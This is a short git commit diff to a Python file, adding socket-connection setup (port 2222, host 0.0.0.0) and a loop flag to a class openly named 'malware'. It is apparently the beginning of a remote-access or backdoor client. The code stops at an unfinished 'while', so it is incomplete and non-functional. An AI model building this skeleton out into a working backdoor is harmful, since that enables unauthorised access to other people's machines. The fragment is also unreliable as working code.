cf8af4c0c95a8274971066cfef5b9213cc649e90
SenhorLoock <71995271+SenhorLoock@users.noreply.github.com>
2023-01-26 07:33:34 -0300

    update

--- app.py
+++ app.py
@@ -6,8 +6,10 @@ import socket
 #Funcoes De Escolha:
 class malware:
   def __init__(self):
+    self.loop = True
     self.port = 2222
     self.host = '0.0.0.0'
     self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   def run(self):
-    
+    self.socket.connect((self.host,self.port))
+    while
